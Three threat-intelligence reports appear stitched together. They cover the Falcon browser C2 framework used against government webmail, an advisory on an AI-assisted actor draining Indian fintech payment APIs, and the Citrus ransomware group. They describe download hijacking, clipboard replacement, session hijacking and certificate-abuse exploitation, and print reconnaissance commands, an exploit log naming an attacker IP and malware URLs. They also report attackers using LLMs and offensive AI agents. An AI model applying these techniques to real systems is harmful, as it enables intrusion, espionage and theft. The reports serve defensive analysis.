Title: The XG Files: Falcon C2 Flying Under The (Browser) Radar
Context: They described it as a versatile tool for exploiting living-off-the-land (LotL) binaries (LOLBins)
Full Text:
Executive Summary

Unit 42 has identified Falcon (aka XG or Xiàng Gē), which is a command and control (C2) framework that compromises victims' browsers by running malicious JavaScript. An actor leveraged Falcon to compromise visitors of webmail portals and government web applications by placing malicious JavaScript directly within these sites.

Operating entirely inside the browser context, attackers have used the framework to sideload malicious Chrome extensions and steal the following information:

Passwords

Emails

Session cookies

Communications

Falcon also served as a delivery mechanism for an implant we call Antino, which uses Microsoft OneDrive as a C2 channel.

Our analysis identified the compromise of government entities in one Middle Eastern country and four Southeast Asian countries between March and May 2026. The campaigns we observed targeted ministries of foreign affairs, defense and interior, and law enforcement agencies, consistent with strategic intelligence collection objectives.

Palo Alto Networks customers are better protected from the threats discussed in this article through the following products and services:

Advanced WildFire

Advanced URL Filtering and Advanced DNS Security

Cortex XDR and XSIAM

Cortex Agentic Endpoint Security

Prisma Browser

Idira Endpoint Privilege Manager (EPM)

Idira Identity and Access Management (IAM)

Organizations can access tailored adversary intelligence, direct analyst consultations, and specialized exposure tracking through Unit 42 Threat Intel Services and its Deep and Dark Web Service.

If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team.

Related Unit 42 Topics

Command and Control (C2), Chrome. JavaScript

Hiding in Plain Sight

Falcon C2 management panels are designed to remain semi-hidden. When accessed, the panel displays a blank page with no visible branding or login interface.

To deter casual inspection, the page disables the right-click context menu via a global contextmenu listener that calls preventDefault(). The login form also stays hidden until the F9 key is pressed three consecutive times; any other keystroke resets the counter.

Figure 1 below shows the JavaScript code for this key tracking.

Once triggered, the page displays a branded Falcon panel featuring a stylized bird logo and credential input fields. This operational security (OPSEC) mechanism ensures that it does not directly expose the login page to bots, unintended visitors and automated systems that grab webpage screenshots.

Figure 2 below shows a screenshot of the login panel.

Falcon is written in NodeJS and has two listeners. One listener is for the management panel interface on TCP port 8080 and the victim-facing listener is on TCP port 443.

On the victim-facing listener, we observed a JavaScript-based version of the classic game Tetris serving as the default page, designed to blend in further. Another instance hosted a game of Snake. Figure 3 below shows both versions.

Overlap with PeckBirdy

In January 2026, Trend Micro reported on a scripting framework dubbed PeckBirdy. They described it as a versatile tool for exploiting living-off-the-land (LotL) binaries (LOLBins).

Our comparison with PeckBirdy revealed that it shares near-identical URL structures, payload delivery mechanisms and communication protocols with Falcon. Table 1 compares the URL structures of the two frameworks.

Both frameworks use the same payload delivery sequence to execute HTA, HTML or JScript payloads, with the primary distinction being Falcon's inclusion of the /config/ path prefix.Both frameworks use AES for data encryption. PeckBirdy relies solely on AES with a predetermined encryption key, whereas Falcon negotiates an AES session key with the server, encrypted with RSA.Most significantly, both frameworks store their persistent session ID using the same Baidu-mimicking naming convention:

PeckBirdy writes its session ID to a browser cookie prefixed with Hm_lvt_

Falcon employs the same prefix for the same purpose, saving it as Hm_lvt_$ in the browser’s local storage and Hm_lvt__<session ID> within a browser cookie

Based on these extensive technical overlaps, we assess with high confidence that Falcon and PeckBirdy represent variants of the same core framework.

The Falcon Implant

When someone visits a website affected by Falcon, the website sends a request to the Falcon C2 server. The server generates an implant uniquely obfuscated for that browser session. The implant is generated by two files: victim_common.js and victim.js.

The first file holds the configuration block described below and the second file contains common functions for communication and command execution. The two files are combined, and then passed through an obfuscation routine that XOR encodes each character in the implant with a one-byte key and converts the result into an integer.

The result is a script with a large list of integers and a small section of code to decode and execute itself. Figure 4 shows an example of the obfuscated script.

Figure 5 shows the template configuration block. The $CLIENT_IP is the victim IP address, set by the server as it generates the implant.

Victim Persistence and Tracking

The implant generates a persistent 32-character lower case alphanumeric session identifier per victim using a three-tier storage strategy designed to survive session restarts:

Browser local storage: Reading and writing a key Hm_lvt_$, likely mimicking Baidu Analytics tracking identifiers to blend with legitimate Chinese web analytics telemetry

Cookie: Setting Hm_lvt__<session ID>=1 with a path of / and an expiry date of the year 2099

Falcon extension storage cache: Checking whether a storageApi object is defined; if so, the session ID is stored there as well

The storageApi is a dictionary within the Falcon browser extension, meaning it is present only if the victim has the Falcon browser extension installed. We detail the browser extension in the Falcon Browser Extension section.

C2 Communication

The implant establishes a TLS encrypted WebSocket connection to maintain a persistent connection as long as the browser tab of the affected webpage is open. It sends a heartbeat message {"heartbeat":"1"} every minute to keep the connection alive. The implant resets the timer on every inbound message, so an actively engaged session never emits standalone heartbeats.

The code supports a fallback protocol using the Comet communication protocol. If Comet is used, payload data exchanged with the C2 server is not encrypted. The WebSocket functionality supports AES encryption in combination with the TLS transport encryption as described below.

Cryptographic Key Exchange

The implant leverages the browser's native Web Crypto API to encrypt all exchanged data using AES. If the Web Crypto API is unavailable, the implant falls back to URL-encoding and Base64. The key exchange proceeds in five steps:

Step 1: The server offers its RSA public key

Upon WebSocket connection, the server pushes a message with an action pubkey containing a 2048-bit RSA public key in PEM format, as illustrated in Figure 6.

Step 2: The client generates 256-bit AES session key material

The implant generates a 32-byte AES key and a 16-byte initialization vector (IV) using the browser's crypto.getRandomValues. If unavailable, a fallback function generates the key material from an alphanumeric string.

Step 3: The client encrypts the session key material using the server’s RSA public key

Both the AES key and IV are individually encrypted using the server's RSA public key and then Base64-encoded.

Step 4: The client sends the encrypted AES key material to the server

The client sends the encrypted key material to the server in a key_exchange message, as shown in Figure 7.

Step 5: All subsequent exchanges have their payload data encrypted with the session key material using AES-256-CBC.

Command Dispatch

Following the key exchange, the implant registers with the server by sending information about its current execution environment. Figure 8 below shows the data before encryption.

The data includes the current URL and domain of the tab within which the Falcon implant is running. The data also includes the browser's User-Agent string and client IP address (set by the backend server during implant generation).

The implant first attempts to read the remark from the browser’s local storage, specifically from the _domain_google_mark field. If unsuccessful, it then searches for the string _domain_google_mark= within the current webpage’s cookies to retrieve the remark.

If the implant uses Comet for communication, it only supports the run and nothing commands, with the latter serving no operational purpose.

The run command enables an operator to execute arbitrary JavaScript code through evaluation by calling eval. The set_remark command applies a remark (or label/comment) to the session, helping the operator organize the sessions in the management panel. It updates the remark for the fields _domain_google_mark across the browser's local storage, document cookie and Falcon extension storage.

The implant implements four main command APIs that attackers can use in custom modules to exfiltrate data, notify an operator or annotate the session in the Falcon database. Table 2 below details the APIs.

Falcon Browser Extension

While the browser implant runs purely in the context of the browser tab, Falcon has two browser extensions to facilitate full control of a victim’s browser:

The extensions work with the implant.

We are currently unaware of how an operator is deploying these browser extensions. It is likely that they are using an initial implant to trick a target into installing the browser extension and granting the operator unfettered browser access.

The two extensions are functionally identical, this section focuses on the Chrome extension.

Declares resources that are world accessible (by other webpages). Extension resources not listed here would result in a cross-origin resource sharing (CORS) error.

Table 5. Falcon extension manifest parameters.

Extension Initialization

When the extension is installed, enabled, or the browser starts, Chrome parses the extension manifest. The background service worker, background.js, runs and creates a hidden or offscreen document from the offscreen.html file.

The offscreen.html file loads offscreen.js (hereafter referred to as offscreen) and creates an iframe to load sandbox.html (which loads sandbox.js, hereafter referred to as sandbox) in parallel.

This structure is common for Chrome extensions that need offscreen documents. The sandbox acts as a code execution environment, allowing eval execution.

Offscreen starts by creating a MessageChannel message bus for communication

between extension components. It delays execution for 2 seconds to allow the message bus to be established before sending a request to the C2 server to download the Falcon implant. The code is passed to the sandbox through the message bus as shown in Figure 12.

The code is executed by appending a script tag to the sandbox.html document body. The implant code, now running inside the sandbox, establishes a WebSocket connection to the C2 server.

In parallel with the background/offscreen initialization, Chrome automatically injects content-script.js (hereafter referred to as content script) into every page visited by the victim due to its manifest definition in content_scripts.

The twitter-dm.js script is injected only if a victim visits twitter[.]com or x[.]com as defined in the manifest. The content script runs in an isolated context and only has access to the webpage's Document Object Model (DOM), but not to its JavaScript context.

To achieve full page context access, the content script injects a script tag into the page pointing to chrome-extension://<extension ID>/analytics-core.js (hereafter called analytics core). Because the analytics core file is defined in web_accessible_resources in the manifest, it is accessible to web pages and not blocked by CORS.

At this point, the extension has:

Full access to the browser's data store (via chrome.* APIs in background.js)

Full access to the context of every webpage the victim visits (via the content script and analytics core)

Web Proxy

Falcon allows an operator to use a victim’s browser as a proxy server and to use the victim’s browser data store, including session cookies and credentials for requests. An operator creates a proxy and attaches it to the victim’s Falcon session.

The operator then configures the victim’s browser with the Falcon server address and the designated proxy port. The operator is then able to send requests to the Falcon implant within the victim’s browser, with these requests encapsulated in a JavaScript snippet. They will then be sent to the victim’s browser as illustrated below in Figure 13.

The sandbox receives and executes the JavaScript. This script calls handleProxyRequest with the request data as an argument, which subsequently sends a message on the Chrome runtime message bus as shown in Figure 14.

The background service worker picks up the messages, constructs the request and sets the fetchOptions to use the victim's credential store in the request. Figure 15 below shows this, highlighted in bold.

The response from the request is Base64-encoded and returned in JSON via the C2 WebSocket. This enables an operator to browse resources using the identity of the victim, allowing for session hijacking and access to internal network resources.

Download Intercept

The extension can intercept and replace file downloads according to operator-defined rules. The operator can define broad rules targeting a list of domain and file extensions.

Figure 16 below shows an example rule that intercepts and replaces all executable downloads from google[.]com and dl.google[.]com with an operator-controlled URL.

The background service worker installs an event listener that listens for chrome.downloads.onCreated events. When detected, the background worker sends a message to offscreen over the Chrome runtime message bus, which it relays to the sandbox.

The sandbox applies the intercept rule set to the download URL to determine whether it should modify the URL. While the background service worker has the necessary privileges to intercept and replace downloads, the extension's architectural design keeps the intercept rules and C2 command processing (which requires eval execution) within the sandbox. This design necessitates passing messages across the message buses.

If the URL matches a rule, the extension cancels the original file transfer and removes the download from the Chrome download history. The new URL consists of the target and redirect URL, where the target URL is encoded and appended to the end of the redirect URL as shown below in Figure 17.

The download retains the original filename and will appear to the victim as ChromeSetup.exe while the origins will show as evil[.]com.

This technique enables an operator to achieve code execution on the victim’s system by intercepting a legitimate download and replacing it with the operator’s payload. It does so leaving little evidence that the file originated from a malicious source. The operator can use this to deploy additional malware and gain a stronger foothold in the target network.

Network Hooking

The functionality of analytics core is to install a hook for window.fetch, XMLHttpRequest.open and XMLHttpRequest.send. This hook enables the extension to intercept requests made from the current webpage and any third-party scripts loaded on the page. The operator can also define intercept rules that can replace a URL with an operator’s own URL (e.g., to hijack software updates).

For window.fetch, the hook intercepts HTTP requests that result in an HTTP 200 response and sets the content type to application/json or contains text/. The intercepted request and response data is posted to the MessageChannel as shown below in Figure 18.

For calls to XMLHttpRequest.send, the hook checks whether the HTTP response code is between 200 and 299, and whether the content type is application/json or contains text/. The hook also checks the responseType attribute to see whether it is text or an empty string.

The intercepted request and response data is posted to the MessageChannel as shown below in Figure 19.

The posted message signals the content script to relay the message from the MessageChannel onto Chrome’s runtime message bus using chrome.runtime.sendMessage as shown below in Figure 20.

The background worker picks up the message and stores it in a cache awaiting operator instructions to upload the data to the C2 server. The cache operates in a FIFO fashion and stores a maximum of 500 requests.

Discord Messages and Friends List Exfiltration

An operator can also target Discord chat messages and friend lists. They achieve this using passive network hooking described above, as Discord uses JSON in its HTTP communication. If configured, the operator can intercept requests matching a Discord URL pattern with victim data stored in a separate table.

Zalo Chat Database Exfiltration

Zalo is a chat application similar to WhatsApp that is popular in Vietnam. Falcon supports intercepting Zalo chat message databases using passive network hooking. Targeting Zalo provides additional insights into the targeted audience of the operator.

Gmail Exfiltration

While the ability to exfiltrate Gmail data is not a core functionality of the extension, it does provide an operator with the access needed to compromise a victim’s Gmail account and download email data. An operator issues a command that uploads a JavaScript to the extension, which sends a request to Gmail using the user’s Gmail session cookie to retrieve a list of authenticated users.

An operator can then select the accounts to collect data from, to be uploaded to the C2 server. This action is facilitated by the extension.

The exfiltrated email data includes:

Date

Receiver

Sender

Subject

Email body

Attachments

Clipboard Hijacking

As soon as the extension is installed, loaded or the browser starts, the clipboard hijacker is actively monitoring the victim’s clipboard events. It intercepts every cut, copy and paste event by adding document listeners as shown below in Figure 21.

By default, the hijacker runs without any rules. An operator has the option to define pattern matching rules and replacements (e.g., replacing account numbers or cryptocurrency wallet addresses).

The rules are stored in Chrome’s local storage chrome.storage.local in a key clipboard_replacer_rules. Figure 22 below shows an example rule.

Intercepted clipboard events are passed as messages on Chrome’s message bus. These messages are picked up by the background worker and stored in a cache similar to the intercepted HTTP requests. They then await an operator command to upload the data.

X/Twitter Direct Messages Exfiltration

The extension comes with a separate module for scraping direct messages from the X/Twitter social media platform. The module is defined in the extension manifest under content_scripts and is injected into any webpage whose URL matches the patterns *://*.twitter.com/* or *://*.x.com/*.

The module can only scrape direct messages when a victim browses a conversation. It cannot enumerate conversations or open other conversations.

The module is notable for using X and Y coordinate systems to identify messages received (left) and sent by the account owner (right), leveraging X/Twitter’s CSS layout. Along with the messages, the module extracts attachment references (URLs) and the associated timestamp. It attempts to translate the timestamp into a uniform format.

Because X/Twitter uses “today” or “yesterday” instead of timestamps for the most recent messages, the module attempts to convert them into timestamps. We found that the module supports six different languages, as shown below in Table 6.

This language support provides insight into the target demographic to extract Twitter/X direct messages.

Continuously Monitoring - Credentials Store, History and Downloads

The extension supports monitoring for sensitive information. It collects some information automatically when the extension is loaded, other information requires an operator to issue a command to enable monitoring. Table 7 shows the various collectors and how they are enabled.

Possible AI-Assisted Development

The Falcon framework shows a high level of complexity in both design and capability. However, the overall code exhibits characteristics suggesting the malware authors likely used AI to assist with design and development. This conclusion is based on the coding style, including variable naming and code comments.

There are also inconsistent design choices that make little sense to a human developer. For example, the network hook for XMLHttpRequest checks for an HTTP response code greater than or equal to 200 but less than 300, while the hook for fetch checks against response.ok. Both result in the same outcome while the first is rarely, if ever, used when the response.ok shortcut exists.

Campaign Tracking

Falcon uses unique attack identifiers to organize campaigns. We identified campaigns targeting government entities across at least five countries, as shown in Table 8.

While all five campaigns leveraged Falcon as their primary C2 framework, each exhibited distinct tradecraft in implant delivery and target selection, demonstrating how the operators tailored their approach to specific environments.

The operator compromised the Middle Eastern country's Ministry of Foreign Affairs Roundcube webmail portal by inserting a script tag that loads the Falcon implant. This enabled the operator to intercept credentials and monitor user sessions.

In Southeast Asian country A, the operator used Falcon to load a custom username-harvesting module. This was followed later by a fake Adobe Flash update prompt that attempted to deliver the Antino implant to pre-selected users.

In Southeast Asian country B, the operator used the Falcon Chrome extension mimicking a PDF viewer to establish persistent access from a browser context.

In Southeast Asian country C, a separate Falcon campaign targeted a military entity.

The following sections detail our analysis of the campaign associated with the Middle Eastern country and Southeast Asian countries A and B.

Middle Eastern Country (Roundcube Webmail)

In April 2026, we observed a Falcon implant residing on the Roundcube webmail portal of a Middle Eastern Ministry of Foreign Affairs. The actor had injected a <script> tag into the portal header as shown in Figure 23.

The resource config_r5lfmqe3 returns the obfuscated JavaScript Falcon implant. This enables the actor to intercept credentials as users sign in. Based on the analyzed data, we assess with high confidence that the script executes on each Roundcube visited by a victim, granting the operator access to a victim’s inbox and account settings.

We observed a total of 39 Roundcube instances being affected within the target country. We have no evidence of any instances affected outside of the target country, suggesting this was a highly targeted campaign.

Southeast Asian Country A - Police Entity (Username Harvesting and Antino Implant Deployment)

In May 2026, we observed the Falcon implant deployed in a web application belonging to a Southeast Asian police entity. The operator deployed a custom Falcon module to harvest usernames and later target specific victims by displaying a fake Adobe Flash Player update prompt with a specific username.

The first module targets the text content of the HTML element with the ID leftusername. It reports the contents to the Falcon C2 using the built-in function xg_note.

This function annotates the session in the Falcon database and sets the implant’s remark attribute. This enables the operator to know which session corresponds to which username. Figure 24 below shows code from this first module.

The module first extracts the text contents of the leftusername element, as the harvesting module does. It compares the username against a hard-coded list of targeted usernames.

If the username matches and the fake Adobe Flash Player pop-up (shown below in Figure 26) has been shown fewer than 10 times, the module displays the pop-up shown below. The pop-up count is stored in the browser’s local storage in a key called popup_count.

Clicking the upgrade button serves the user with an implant, Antino, documented in the section: Antino Implant. The payload was served from hxxps[:]//microsoft-flash[.]com/download/Adobe_installer.exe.

Southeast Asian Country B - Justice Entity (Falcon Browser Extension)

In early 2026, we identified the compromise of an entity affiliated with a national justice department in a Southeast Asian country. Unlike other campaigns attributed to this actor, this intrusion likely relied on a different initial access vector: a malicious Chrome browser extension.

The extension (ID: mbidcmlcbgbphpoacojjbmfpohcimjji) mimicked a legitimate PDF viewer. It was sideloaded in Chrome's developer mode and ran persistently in the victim's browser with a broad permission set, as documented in the section: Falcon Browser Extension.

Communication with the operator's infrastructure was maintained over a long-lived WebSocket originating from the extension's own sandbox context. The compromised browser checked in every 3-4 minutes for more than 3 weeks.

Beyond ambient data collection, the extension provided the operator with persistent visibility into the victim's day-to-day work inside the national justice department's internal document system. This document system is used to route, print and track official correspondence between high-ranking officials and subordinate staff.

Title: CERT-In’s CRAFTY FALCON Advisory: AI Is the Accelerant, Your Payment APIs Are the Target
Context: CERT-In's critical advisory, last week, gives a name to the campaign draining Indian fintechs: CRAFTY FALCON, an "AI-assisted financial threat actor" that moves money by calling...
Full Text:
CERT-In's critical advisory, last week, gives a name to the campaign draining Indian fintechs: CRAFTY FALCON, an "AI-assisted financial threat actor" that moves money by calling its victims' own payment and disbursement APIs. Organizations that fixed their systems after CERT-In's first warning in October have been hit again.

The AI label will get the headlines. The attack chain tells a plainer story. Hardcoded API tokens, staging servers that share credentials with production, IP allow-lists that trust shared third-party fetchers: none of these weaknesses is new. What the AI tooling changes is the time between an attacker finding one and cashing it out, and that time is now shorter than most remediation cycles.

What CERT-In has confirmed

The latest advisory updates the previous Oct. 9 advisory. CERT-In's finance team, CSIRT-Fin, named the actor and called the campaign active and ongoing, with victims across NBFCs, digital lenders, fintechs, payment aggregators, payment service providers and crypto exchanges.

Entities that had received the earlier restricted advisories and remediated were deliberately hit again, some after incomplete cleanup, with attacks timed for holidays and weekends.

CERT-In names four publicly available offensive AI tools: ARTEX, the PentAGI multi-agent pentest system, the Cairn attack search engine and CyberStrikeAI. It doesn't attribute the actor or say how many entities were hit. Business Standard reported that researchers link at least two of the tools to China, but where a tool was written says little about who ran it.

How CRAFTY FALCON gets from a staging server to a mule account

The advisories describe four stages:

Get in. Exposed UAT and staging servers, file-upload and deserialization flaws exploited as soon as they're public, hardcoded API tokens, forged repository commits, plaintext credentials and services without MFA.

Reach production. Credentials and network paths shared with production carry the attacker across. AWS Systems Manager and Lambda then run commands through legitimate cloud channels.

Get past the app. The attacker reverse-engineers the app, calls APIs from a modified package and routes traffic through allow-listed third-party fetcher IPs that anyone can make fetch a URL.

Test, cash out, clean up. A Rs 1 transfer confirms the route. Large transfers follow to mule accounts at several banks, including through merchant settlement APIs, and crypto platforms lose wallet keys. Logs and endpoint tools get tampered with.

Because the calls come from the victim's own allow-listed infrastructure, the October advisory says they bypass KYC, beneficiary verification, balance and per-transaction limit checks. To the payment partner, the fraud looks like normal traffic.

Also read: Addressing Deepfake Risks in BFSI: Why Early Detection Is Critical

The real story: AI took away the grace period

Is "AI-driven" doing too much work here? Partly. Hardcoded tokens, plaintext credentials and missing MFA were in the October advisory before the AI tools took center stage.

What the tooling changes is cost and tempo. CERT-In says the frameworks run full attack chains on their own, refine tailored scripts in rapid succession, adapt payloads to how the target responds and rotate infrastructure within hours. Reverse-engineering one lender's app used to be a project. Now an agent can work through a target list.

That explains the re-targeting. An agent can come back, test whether the fix was complete and try the next path on a Saturday night. Patching in the next sprint assumes an attacker who gets tired. This one doesn't.

Who's exposed

Any Indian entity that can move money through an API: lenders with disbursement APIs, aggregators with settlement APIs, fintechs holding partner-bank credentials and crypto exchanges with hot wallets. You're most exposed if an internet-facing non-production environment shares anything with production, or if your payment API trusts the client app or a source IP instead of a signed, server-validated request.

What to do this week

CERT-In lists 27 actions. Start with the six that break the money path:

Cut non-production off from production. No shared credentials, keys, databases or routes, and alert on any UAT-to-production access.

Stop trusting the client and the source IP. Validate server-side, sign requests with a nonce and timestamp, use app attestation, and swap fetcher IP allow-lists for mutual TLS or scoped keys.

Retire long-lived secrets. Scan repositories and CI/CD for secrets, move to short-lived scoped tokens and rotate build and deployment tokens now.

Hold the Rs 1 pattern. Flag micro-value transfers to new beneficiaries followed by large ones, and add cooling periods and maker-checker approval on merchant settlements.

Watch the cloud control plane. Alert in AWS CloudTrail on Systems Manager sessions and SendCommand, Lambda UpdateFunctionCode in production and new IAM users, roles or keys. Default-deny server egress.

Staff the weekend and assume persistence. Lower holiday alert thresholds and verify eradication forensically.

What we're watching

The offensive tools are compromised too, though nothing ties this to CRAFTY FALCON. Researcher Badbyte recently said that a GitHub copy of ARTEX pulled a Docker image with a hidden root shell, and 62 internet-facing consoles served it between Nov. 2 and 4. It's one more reason CERT-In wants these tools banned from corporate infrastructure.

Sources

The Hacker News, CERT-In Flags AI-Driven Attacks as Backdoored ARTEX Exposes 62 Consoles to Root Access, Nov. 5, 2026 (summary of CIAD-2026-0046 and Badbyte's ARTEX research)

Title: Citrus Ransomware: VLESS for traffic, Sn00py for encryption, and LLMs lending a hand
Context: The PowerShell scripts run through this file included an exploit for the CVE-2020-1337 vulnerability; the same exploit is available in the Metasploit GitHub repository
Full Text:
In recent years, cyberthreats have increasingly taken a hybrid approach, combining time-tested techniques for advancing through infrastructure, modern methods of evading network filters, and automation powered by large language models. This is also the approach of Citrus Ransomware, a previously undocumented group whose toolset includes VLESS tunnels (used to disguise traffic as regular HTTPS) and a ransomware Trojan from the Sn00py family. The attackers also integrate LLMs (large language models) into the process of infrastructure compromise.

In this article, we review the tactics and techniques the group used in recent incidents.

Initial Access: attacks through contractors

The attackers gain initial access to victims’ infrastructure through compromised contractors. They use credentials stolen from these contractors’ employees to connect to corporate VPNs or directly to internet-facing terminal servers over RDP.

Execution: commands, LLMs, and Impacket

The attackers run commands on compromised systems through the standard Windows command interpreter and PowerShell. As the attack progresses, they create and run PowerShell scripts, batch files, and commands generated by LLMs. One example of the latter is the commands below, which disable the account of one of the administrators.

Comment translation

# Disable account # Verify result

Both commands come with comments, something attackers rarely bother with, so the comments very likely point to LLM use. And the models did more than generate commands. The attackers also produced full scripts, complete with the comments typical of LLM output.

Comment translation

# Creating background tasks for each computer with a thread limit # Concurrent task limit control # Quick ping

The fragment above comes from a script Citrus used to enumerate active user sessions on domain systems.

Besides LLMs, the attackers use atexec, a classic tool from the Impacket collection, to create scheduled tasks that run commands on hosts:

Task name

Launched executable file

sIErKswD

C:\Windows\System32\..\System32\cmd.exe

PpMBCCSR

C:\Windows\system32\cmd.exe

QwZtLmNp

C:\Windows\..\Windows\System32\cmd.exe

We did not see the exact commands behind these tasks, but Group Policy was refreshed after they ran, so they most likely executed gpupdate /force.

When the group compromises 1C:Enterprise servers, it uses external data processors (1C-Shell) to run commands.

Persistence: scheduled tasks

Citrus uses scheduled tasks to launch its malicious tools automatically. The attackers create the tasks manually through PowerShell:

On systems that are not regularly rebooted, such as terminal servers, they sometimes run their tools without establishing persistence at all.

Privilege Escalation: vulnerabilities and configuration flaws

In every case we know of, the contractor domain account used for initial access had very limited privileges, so the attackers tried to escalate them.

To do this, they attempted to exploit the authentication bypass vulnerability CVE-2026-54121 (Certighost); these attempts created machine accounts with telltale names in Active Directory, such as:

GHOSTAUFTAFGS

GHOSTCZYQVAZS

GHOSTIVPRLDZA

GHOST{8 random letters}

These names are generated by scripts making use of an exploit published on GitHub.

The exploit works like this: on behalf of the newly created account, it requests a certificate based on the Machine template from the system holding the AD CS role. The Attributes, Subject, and SubjectAlternativeName fields contain parameters like these:

<Data Name='Attributes'>CertificateTemplate:Machine\nSAN:dns=dc01.victim.domain\ncdc:91.210.109[.]118\nrmd:dc01.victim.domain </Data> <Data Name='Subject'>CN=GHOSTABUIEFAD.victim.domain</Data> <Data Name='SubjectAlternativeName'>DNS name =dc01.victim.domain\r\n</Data>

The cdc attribute specifies the IP address or name of the system that the certification authority must contact to verify the data. The attackers specify the address of a system they control (in this case, 91.210.109[.]118) and send forged data from it. If exploitation succeeds, the certification authority issues a certificate with the specified parameters, based on the specified template.

Once the certificate is issued, the domain controller name in its SubjectAlternativeName field lets the attackers authenticate as the domain controller account.

In one case, the attackers also uploaded an executable for persistence, on behalf of which PowerShell scripts were launched with nonstandard HostName (Имя узла) field value.

Field name translation

Severity HostName HostVersion HostId HostApplication EngineVersion RunspaceId PipelineId CommandName CommandType ScriptName

Although the file was later deleted, indirect evidence hints at its purpose. For example, the MSFConsole value may indicate that the file is a component of the Metasploit framework. The PowerShell scripts run through this file included an exploit for the CVE-2020-1337 vulnerability; the same exploit is available in the Metasploit GitHub repository.

Beyond classic vulnerabilities in Microsoft products, the attackers also took an interest in 1C:Enterprise servers with insecure configurations (article in Russian).

On top of the configuration flaws, 1C:Enterprise systems are frequently accessed by support staff and administrators who hold elevated privileges in Active Directory. Together, these factors make it easy for attackers to escalate privileges and start moving laterally.

Stealth: covering tracks and masquerading

To hinder incident response, the attackers delete their tools and output files and clear the command history.

While the tools are still in use in the victim’s infrastructure, the attackers typically give them and their auxiliary objects legitimate-looking names:

KasperskyGPO_Deploy_64.exe and KasperskyGPO_Deploy_64_FIXED.exe are self-extracting archives. They contain the Deploy-KasperskyGPO.ps1 script, a directory with a malicious Group Policy Object, and one of two archives, KasperskyAgent.exe or agent.exe.

KasperskyAgentInstaller.exe, KasperskyAgent.exe, and agent.exe are self-extracting archives containing the ransomware Trojan executable and auxiliary files.

Kaspersky GPO is the name of the Group Policy Object that distributes the ransomware Trojan in the victim’s infrastructure.

KasperskyAgentInstallTask and Sysvc are names used for the scheduled task that runs the self-extracting ransomware archive files.

Deploy-KasperskyGPO.ps1 is the PowerShell script that creates the malicious Kaspersky GPO.

Kaspersky_GPO_Deployment.log is the log of the Deploy-KasperskyGPO.ps1 script.

Note that using the Kaspersky name in malicious file names doesn’t help the attackers avoid detection. Kaspersky solutions successfully detect and block these malicious files.

Defense Impairment: weak access policies for security tools play into attackers’ hands

To stay under the radar longer, the attackers clear event logs on some systems using the built-in wevtutil utility.

In addition, once they have sufficient privileges, they disable antivirus protection on hosts, which lets them run tools such as mimikatz.

The attackers also go after the centralized management consoles for security solutions, which they then use to disable protection en masse.

At the Impact stage, the attackers also use a Group Policy Object that modifies Windows Defender settings in the registry to switch it off. As a result, the antivirus did not respond when the ransomware was launched.

Finally, if they have sufficient privileges, the attackers manually add their malicious tools to the antivirus exclusion list.

Credential Access: mimikatz, a keylogger, and extraction of credentials from files

To capture keystrokes on a compromised system, the attackers use a modified version of the peeping-tom keylogger, whose source code is available on GitHub. The keylogger executable and its log file are located at the following paths:

C:\ProgramData\Oracle\Java\jhost.exe

C:\Users\<username>\AppData\Roaming\Microsoft\CLR\ErrorLog.txt

In the sample we found, stolen data was sent to 91.210.109[.]118. Persistence for the keylogger is provided by the scheduled task described above in the Persistence section.

To dump credentials from memory, the attackers use mimikatz. Files related to mimikatz are located at the following paths:

C:\ProgramData\x64\mimidrv.sys

C:\ProgramData\x64\mimikatz.exe

C:\ProgramData\x64\mimilib.dll

C:\ProgramData\x64\mimispool.dll

To hunt for credentials and other secrets (SSH keys, access tokens, and the like) in files on accessible network shares, the group uses Snaffler. To simplify running the tool, the attackers drop a configuration file on the system:

Besides data from network shares, the attackers were interested in data stored in password managers (for example, KeePass) on administrator workstations.

Discovery: the standard toolkit

Local discovery

After gaining control of a compromised system, the attackers ran a basic set of commands to identify the current user, running processes, network interface settings, the system’s external IP address, and so on:

whoami tasklist quser ipconfig curl 2ip[.]io

Remote discovery

In the early stages, the attackers used the fscan scanner to gather information on the internal infrastructure. They were particularly interested in the following ports:

135 (RPC)

139 (NetBIOS-SSN)

1433 (Microsoft SQL)

8006 (Proxmox VE)

Once they had the access they needed and had moved laterally, the attackers ran ADRecon on domain controllers and SharpHound on one of the workstations.

The attackers also used PowerShell to run LDAP queries against the controllers of adjacent domains, pulling lists of domain systems, users, and groups.

Russian text translation

The user has no additional groups in memberOf (primary only) User not found

As an alternative to PowerShell, the attackers used the net.exe utility to get information about domain users and privileged groups:

net users /domain net group "Domain Admins" /domain net group "Администраторы домена" /domain

Lateral Movement: SSH, RDP, and WinRM

For lateral movement, the group relies on standard remote administration protocols: SSH, WinRM, and RDP. The attackers connect to systems either through previously deployed tunnels or directly from the compromised host.

Command and Control: delivering tools to the system

To deliver its tools to target hosts, the group uses built-in OS utilities. Specifically, the incidents involved:

certutil:

The Windows BITS background service (invoked in two ways):

cURL:

PowerShell:

Creating tunnels with Xray

The certutil and BITS commands shown above are what the attackers used to download Xray onto victim systems. They then used Xray to set up reverse VLESS tunnels to the command-and-control server. The configuration file, stored alongside the Xray executable, was usually named config.json. In some cases, the attackers deleted it right after starting the tunnel to hide the Xray configuration from defenders.

Judging by the configuration files recovered during the analysis, the attackers used port 443 on the VLESS server to blend in with legitimate HTTPS traffic. The configuration files also contain blocks that set up the REALITY protocol, which is intended to disguise the attackers’ traffic as requests to the legitimate site mirror.yandex.ru:

The traffic was also disguised as requests to another legitimate site, yastatic.net:

Installing AnyDesk

The PowerShell command above AnyDesk, which the attackers used to remotely control compromised hosts.

After the download, the attackers installed the software with the --silent flag to avoid alerting the user, set a connection password, and used PowerShell to pull the infected machine’s ID (which AnyDesk uses for remote connections on the client side) from the configuration file:

Collection & Exfiltration: data from messaging apps

Right before encrypting the data, the attackers connected to one of the domain controllers and ran the PowerShell script steal_tgs.ps1, which created the tdatas directory. According to the NTFS USN journal, while the script ran, 7-Zip created archives in this directory with telltale names hinting at their contents:

<system_name>_<date>_<username>_tdata.zip

The directory name tdatas and the substring tdata may refer to the C:\Users\<username>\AppData\Roaming\Telegram Desktop\tdata directory. The Telegram messaging app uses this directory to store authorization keys, session data, app settings, and other session information.

So the attackers were harvesting messaging app data from remote systems they could reach, packing it with 7-Zip and uploading it to an external web service through Google Chrome.

Impact: Sn00py ransomware Trojan

The Citrus group uses ransomware from the Sn00py family to encrypt data. It’s written in Go and uses the RSA-2048 and ChaCha20 algorithms to encrypt user files (but not system files) on Windows systems. Encrypted files receive the .citrus extension. For now, decryption is impossible without the attackers’ private key.

